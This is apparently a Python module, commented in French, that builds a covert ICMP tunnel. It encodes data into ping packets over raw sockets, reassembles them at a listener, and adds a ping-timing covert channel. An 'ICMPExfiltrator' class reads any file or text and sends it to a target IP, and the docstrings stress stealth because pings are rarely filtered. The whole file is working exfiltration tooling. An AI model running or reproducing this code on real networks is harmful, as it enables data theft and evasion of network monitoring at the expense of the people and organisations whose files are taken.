"""
ICMP Tunneling - Communication furtive via paquets ICMP (ping)
Encode les données dans les paquets ICMP echo request/reply
"""
import socket
import struct
import time
import random
from typing import Optional, Tuple
import os


class ICMPTunnel:
    """
    Tunnel ICMP pour communication furtive
    
    Utilise les paquets ICMP (ping) pour transporter des données
    Très furtif car les pings sont rarement filtrés
    """
    
    # Types ICMP
    ICMP_ECHO_REQUEST = 8
    ICMP_ECHO_REPLY = 0
    
    def __init__(self, max_payload_size: int = 56):
        """
        Args:
            max_payload_size: Taille max du payload ICMP (bytes)
        """
        self.max_payload_size = max_payload_size
        self.sequence = 0
        self.identifier = random.randint(1, 65535)
    
    def send_via_icmp(self, data: bytes, target_ip: str, delay: float = 0.5) -> bool:
        """
        Envoie des données via ICMP tunneling
        
        Args:
            data: Données à envoyer
            target_ip: IP cible
            delay: Délai entre paquets
        
        Returns:
            True si succès
        """
        # Découpage en chunks
        chunks = [data[i:i+self.max_payload_size] 
                  for i in range(0, len(data), self.max_payload_size)]
        
        print(f"[ICMPTunnel] Sending {len(data)} bytes in {len(chunks)} ICMP packets to {target_ip}")
        
        try:
            # Création du socket RAW (nécessite root)
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(5.0)
        except PermissionError:
            print("[ICMPTunnel] ERROR: Need root privileges for RAW sockets")
            return False
        
        try:
            for i, chunk in enumerate(chunks):
                # Construction du paquet ICMP
                packet = self._build_icmp_packet(chunk, self.sequence + i)
                
                # Envoi
                sock.sendto(packet, (target_ip, 0))
                
                print(f"[ICMPTunnel] Sent packet {i+1}/{len(chunks)} (seq={self.sequence + i})")
                
                # Délai entre paquets
                time.sleep(delay + random.uniform(-0.1, 0.1))
            
            self.sequence += len(chunks)
            
            sock.close()
            print("[ICMPTunnel] ✓ Data sent successfully")
            return True
            
        except Exception as e:
            print(f"[ICMPTunnel] Send error: {e}")
            sock.close()
            return False
    
    def receive_via_icmp(self, timeout: float = 60.0) -> Optional[bytes]:
        """
        Reçoit des données via ICMP tunneling
        
        Args:
            timeout: Timeout d'écoute (secondes)
        
        Returns:
            Données reçues ou None
        """
        print(f"[ICMPTunnel] Starting ICMP listener (timeout: {timeout}s)")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(timeout)
        except PermissionError:
            print("[ICMPTunnel] ERROR: Need root privileges for RAW sockets")
            return None
        
        received_chunks = {}
        start_time = time.time()
        
        try:
            while time.time() - start_time < timeout:
                try:
                    packet, addr = sock.recvfrom(2048)
                    
                    # Parse du paquet
                    icmp_type, sequence, payload = self._parse_icmp_packet(packet)
                    
                    if icmp_type == self.ICMP_ECHO_REQUEST:
                        print(f"[ICMPTunnel] Received ICMP packet from {addr[0]} (seq={sequence}, {len(payload)} bytes)")
                        
                        # Stockage du chunk
                        received_chunks[sequence] = payload
                    
                except socket.timeout:
                    print("[ICMPTunnel] Timeout waiting for packets")
                    break
                except Exception as e:
                    print(f"[ICMPTunnel] Receive error: {e}")
                    continue
        
        finally:
            sock.close()
        
        # Reconstruction des données
        if received_chunks:
            # Tri par séquence
            sorted_chunks = [received_chunks[seq] for seq in sorted(received_chunks.keys())]
            data = b''.join(sorted_chunks)
            
            print(f"[ICMPTunnel] ✓ Received {len(received_chunks)} packets, {len(data)} bytes total")
            return data
        else:
            print("[ICMPTunnel] No data received")
            return None
    
    def _build_icmp_packet(self, payload: bytes, sequence: int) -> bytes:
        """
        Construit un paquet ICMP echo request
        
        Args:
            payload: Données à inclure
            sequence: Numéro de séquence
        
        Returns:
            Paquet ICMP complet
        """
        # Header ICMP: type (1), code (1), checksum (2), id (2), sequence (2)
        icmp_type = self.ICMP_ECHO_REQUEST
        code = 0
        checksum = 0  # Temporaire
        
        # Construction du header (sans checksum)
        header = struct.pack('!BBHHH', icmp_type, code, checksum, self.identifier, sequence)
        
        # Calcul du checksum
        checksum = self._calculate_checksum(header + payload)
        
        # Reconstruction avec le bon checksum
        header = struct.pack('!BBHHH', icmp_type, code, checksum, self.identifier, sequence)
        
        return header + payload
    
    def _parse_icmp_packet(self, packet: bytes) -> Tuple[int, int, bytes]:
        """
        Parse un paquet ICMP
        
        Args:
            packet: Paquet brut
        
        Returns:
            (type, sequence, payload)
        """
        # Skip IP header (20 bytes)
        icmp_packet = packet[20:]
        
        # Parse ICMP header
        icmp_type, code, checksum, identifier, sequence = struct.unpack('!BBHHH', icmp_packet[:8])
        
        # Payload
        payload = icmp_packet[8:]
        
        return icmp_type, sequence, payload
    
    def _calculate_checksum(self, data: bytes) -> int:
        """
        Calcule le checksum ICMP (RFC 1071)
        
        Args:
            data: Données
        
        Returns:
            Checksum
        """
        # Padding si longueur impaire
        if len(data) % 2 != 0:
            data += b'\x00'
        
        # Somme des mots de 16 bits
        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]
            checksum += word
        
        # Fold carry
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum += (checksum >> 16)
        
        # Complément à 1
        checksum = ~checksum & 0xffff
        
        return checksum


class ICMPExfiltrator:
    """Classe d'aide pour exfiltration via ICMP"""
    
    @staticmethod
    def exfiltrate_text(text: str, target_ip: str, delay: float = 0.5) -> bool:
        """
        Exfiltre du texte via ICMP
        
        Args:
            text: Texte à exfiltrer
            target_ip: IP cible
            delay: Délai entre paquets
        
        Returns:
            True si succès
        """
        tunnel = ICMPTunnel()
        return tunnel.send_via_icmp(text.encode(), target_ip, delay)
    
    @staticmethod
    def exfiltrate_file(file_path: str, target_ip: str, delay: float = 0.5) -> bool:
        """
        Exfiltre un fichier via ICMP
        
        Args:
            file_path: Chemin du fichier
            target_ip: IP cible
            delay: Délai entre paquets
        
        Returns:
            True si succès
        """
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            tunnel = ICMPTunnel()
            return tunnel.send_via_icmp(data, target_ip, delay)
            
        except Exception as e:
            print(f"[ICMPExfiltrator] Failed: {e}")
            return False


class PingCovertChannel:
    """
    Canal caché basé sur les timings de ping
    Utilise les délais entre pings pour encoder des bits
    """
    
    def __init__(self, short_delay: float = 0.1, long_delay: float = 0.3):
        """
        Args:
            short_delay: Délai court = bit 0
            long_delay: Délai long = bit 1
        """
        self.short_delay = short_delay
        self.long_delay = long_delay
        self.tunnel = ICMPTunnel()
    
    def encode_timing(self, data: bytes, target_ip: str) -> bool:
        """
        Encode des données via les timings de ping
        
        Args:
            data: Données à encoder
            target_ip: IP cible
        
        Returns:
            True si succès
        """
        # Conversion en bits
        bits = ''.join(format(byte, '08b') for byte in data)
        
        print(f"[PingCovertChannel] Encoding {len(data)} bytes ({len(bits)} bits) via timing")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            print("[PingCovertChannel] ERROR: Need root privileges")
            return False
        
        try:
            for i, bit in enumerate(bits):
                # Construction d'un paquet ping simple
                packet = self.tunnel._build_icmp_packet(b'timing', i)
                
                # Envoi
                sock.sendto(packet, (target_ip, 0))
                
                # Délai selon le bit
                delay = self.long_delay if bit == '1' else self.short_delay
                time.sleep(delay)
            
            sock.close()
            print("[PingCovertChannel] ✓ Data encoded in timings")
            return True
            
        except Exception as e:
            print(f"[PingCovertChannel] Encoding failed: {e}")
            sock.close()
            return False


if __name__ == '__main__':
    # Test du ICMP tunneling
    print("=== ICMP Tunnel Test ===\n")
    
    # Vérification des privilèges
    if os.geteuid() != 0:
        print("⚠️  WARNING: ICMP tunneling requires root privileges")
        print("Run with: sudo python3 icmp_tunnel.py")
        print("\nRunning limited tests without sending actual packets...\n")
        
        # Tests limités
        tunnel = ICMPTunnel()
        
        # Test de construction de paquet
        print("1. Testing ICMP packet construction...")
        test_payload = b"Test data"
        packet = tunnel._build_icmp_packet(test_payload, 1)
        print(f"✓ Packet constructed: {len(packet)} bytes")
        
        # Test de checksum
        print("\n2. Testing checksum calculation...")
        checksum = tunnel._calculate_checksum(b"test")
        print(f"✓ Checksum calculated: {checksum}")
        
    else:
        print("✓ Running with root privileges\n")
        
        # Test complet
        tunnel = ICMPTunnel()
        test_data = b"Secret ICMP tunnel message"
        
        print("1. Testing ICMP send to localhost...")
        success = tunnel.send_via_icmp(test_data, "127.0.0.1", delay=0.1)
        
        if success:
            print("✓ ICMP send successful")
        
        print("\n2. Testing covert channel...")
        covert = PingCovertChannel()
        covert.encode_timing(b"Hi", "127.0.0.1")
    
    print("\n✓ Test complete")
    print("\nUsage examples:")
    print("  - Send: sudo python3 icmp_tunnel.py send <target_ip> <message>")
    print("  - Receive: sudo python3 icmp_tunnel.py listen")
